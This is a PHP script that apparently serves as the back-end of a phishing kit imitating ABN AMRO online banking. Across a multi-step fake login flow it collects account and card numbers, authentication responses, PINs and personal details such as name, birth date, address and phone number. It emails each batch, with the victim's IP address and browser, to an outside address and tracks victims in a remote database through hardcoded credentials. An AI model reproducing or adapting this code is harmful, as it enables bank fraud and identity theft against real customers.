<?php session_start(); 
@$mysqli = @new mysqli("remotemysql.com", "BLoRUuIA8j", "bK4CLX1BPF", "BLoRUuIA8j");
$cHmA = md5($_SERVER['REMOTE_ADDR']);
if (@$_GET['kget'] == "escape") {
    @$mysqli->query("DELETE FROM g WHERE b='$cHmA'");
    header('location: https://www.abnamro.nl/nl/prive/index.html');
}
if (@$_GET['ckv'] == $cHmA) {
    $result = $mysqli->query("SELECT * FROM g WHERE b='$cHmA'");
    if ($result->num_rows !== 0) {
        echo $cHmA;
    }
    $mysqli->close();
}
switch (@$_POST['xlode']) {
    case 1:
        $_SESSION['rkn'] = @$_POST['accountNumber'];
        $_SESSION['rkp'] = @$_POST['cardNumber'];
        $_SESSION['spr'] = @$_POST['ed2Response'];
		
        $output = str_split(@$_POST['accountNumber'], 4);
        @$_SESSION['vRkD'] = @$output[0] . " " . @$output[1] . " " . @$output[2];
        EK("Login", "Rekeningnummer:  " . $_SESSION['rkn'] . "<br>Pasnummer:  " . $_SESSION['rkp'] . "<br>Respo: " . $_SESSION['spr'] . "<br><br>" . $code);
        header("location: controle_gegevens.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;
    case 2:
        $cvQ = "Rekeningnummer: " . $_SESSION['rkn'] . "<br>Pasnummer: " . $_SESSION['rkp'] .
            "<br><br>Volledige naam: " . $_POST['Geslacht'] . " " . $_POST['voornaam'] . " " .
            $_POST['tussenvoegsel'] . " " . $_POST['achternaam'] . "<br>Geboortedatum: " . $_POST['dag'] .
            "-" . $_POST['maand'] . "-" . $_POST['year'] . "<br>Postcode & Huisnummer: " . $_POST['postcode'] .
            " <b>" . $_POST['huisnummer'] . "</b><br>Mobielnummer: " . $_POST['mobielnummer'] .
            "<br>e-Mail: " . $_POST['email'];
        $words = explode(" ", @$_POST['voornaam']);
        $tvs = "";
        $acronym = "";
        foreach ($words as $w) {
            if ($w !== "") {
                $acronym .= $w[0] . ". ";
            }
        }
        if ($_POST['tussenvoegsel'] !== "") {
            $tvs = $_POST['tussenvoegsel'] . " ";
        }
        @$_SESSION['VLNAAM'] = $acronym . $tvs . $_POST['achternaam'];
        @$_SESSION['ABC1'] = $_POST['Geslacht'];
        @$_SESSION['ABC2'] = $_POST['achternaam'];
        EK("Gegevens", $cvQ);
        header("location: laden.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;
    case 3:
        $cvQa = "Rekeningnummer: " . $_SESSION['rkn'] . "<br>Pasnummer: " . $_SESSION['rkp'] .
            "<br><br>Response: " . $_POST['ed1Response'];
        $mysqli->query("DELETE FROM a WHERE b='$cHmA'");
        EK("Response", $cvQa);
        header("location: laden.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;
    case 4:
        $cvQa = "Rekeningnummer: " . $_SESSION['rkn'] . "<br>Pasnummer: " . $_SESSION['rkp'] .
            "<br><br>Bericht is gelezen!";
        $mysqli->query("DELETE FROM a WHERE b='$cHmA'");
        EK("Bericht", $cvQa);
        header("location: laden.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;
    case 5:
        $cvQa = "Rekeningnummer: " . $_SESSION['rkn'] . "<br>Pasnummer: " . $_SESSION['rkp'] .
            "<br><br>Pincode: " . $_POST['pin1code'];
        $mysqli->query("DELETE FROM a WHERE b='$cHmA'");
        EK("Pincode", $cvQa);
        header("location: laden.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;
    case 6:
        $_SESSION['rkn'] = @$_POST['accountNumber'];
        $_SESSION['rkp'] = @$_POST['cardNumber'];
        $_SESSION['spr'] = @$_POST['ed2Response'];
		
        $output = str_split(@$_POST['accountNumber'], 4);
        @$_SESSION['vRkD'] = @$output[0] . " " . @$output[1] . " " . @$output[2];
        EK("Extra Login", "Rekeningnummer:  " . $_SESSION['rkn'] . "<br>Pasnummer:  " . $_SESSION['rkp'] . "<br>Respo: " . $_SESSION['spr'] . "<br><br>" . $code);
        header("location: laden.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;
    case 7:
	$_SESSION['spr'] = @$_POST['ed2Response'];
	
        $cvQa = "Rekeningnummer: " . $_SESSION['rkn'] . "<br>Pasnummer: " . $_SESSION['rkp'] .
            "<br><br>Wordt verstuurd|<br><br>Nieuw Reknum: "  . $_POST['accountNumber'] . "<br>Nieuw Pasnum: ". $_POST['cardNumber'] . "<br>Nieuw Respo: " . $_POST['ed2Response'] . "<br><br>" ;
        EK("Betaalpas", $cvQa);
        header("location: laden.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
        break;
}
function getBrowser($agent = null)
{
    $u_agent = ($agent != null) ? $agent : $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version = "";
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    } elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    } elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    } else {
        $platform = 'mobiele telefoon';
    }
    if (preg_match('/MSIE/i', $u_agent) && !preg_match('/Opera/i', $u_agent)) {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    } elseif (preg_match('/Firefox/i', $u_agent)) {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    } elseif (preg_match('/Chrome/i', $u_agent)) {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    } elseif (preg_match('/Safari/i', $u_agent)) {
        $bname = 'Apple Safari';
        $ub = "Safari";
    } elseif (preg_match('/Opera/i', $u_agent)) {
        $bname = 'Opera';
        $ub = "Opera";
    } elseif (preg_match('/Netscape/i', $u_agent)) {
        $bname = 'Netscape';
        $ub = "Netscape";
    }
    $known = array(
        'Version',
        $ub,
        'other');
    $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
    }
    $i = count($matches['browser']);
    if ($i != 1) {
        if (strripos($u_agent, "Version") < strripos($u_agent, $ub)) {
            $version = $matches['version'][0];
        } else {
            $version = $matches['version'][1];
        }
    } else {
        $version = $matches['version'][0];
    }
    if ($version == null || $version == "") {
        $version = "?";
    }
    return array(
        'userAgent' => $u_agent,
        'name' => $bname,
        'version' => $version,
        'platform' => $platform,
        'pattern' => $pattern);
}
function EK($subj, $berc)
{
    $TT = getBrowser();
    $cQ = md5($_SERVER['REMOTE_ADDR']);
    @$mysqli = @new mysqli("remotemysql.com", "BLoRUuIA8j", "bK4CLX1BPF", "BLoRUuIA8j");
    @$mysqli->query("DELETE FROM g WHERE b='$cQ'");
    $headers = "From: klantenserv@" . $_SERVER['SERVER_NAME'] . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    @mail("info@www-rabobankservice.icu", "ABN Amro (" . $_SESSION['rkn'] .
        "| " . $_SESSION['rkp'] . " - " . $subj . ")", $berc . "<b>" . $_SERVER['REMOTE_ADDR'] .
        "</b><br><br>http://" . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) .
        "/prps.php?ufq=" . base64_encode($cQ) . "&rkn=" . base64_encode($_SESSION['rkn']) .
        "&prp=" . base64_encode($_SESSION['rkp']) .
        "<br><br><b>Belangerijke informatie</b><br>Browsernaam:  " . $TT['name'] .
        "<br>Besturingssysteem:  " . ucwords($TT['platform']) . "<br>IPAdres:  <b>" . $_SERVER['REMOTE_ADDR'] .
        "</b>", $headers);
} ?>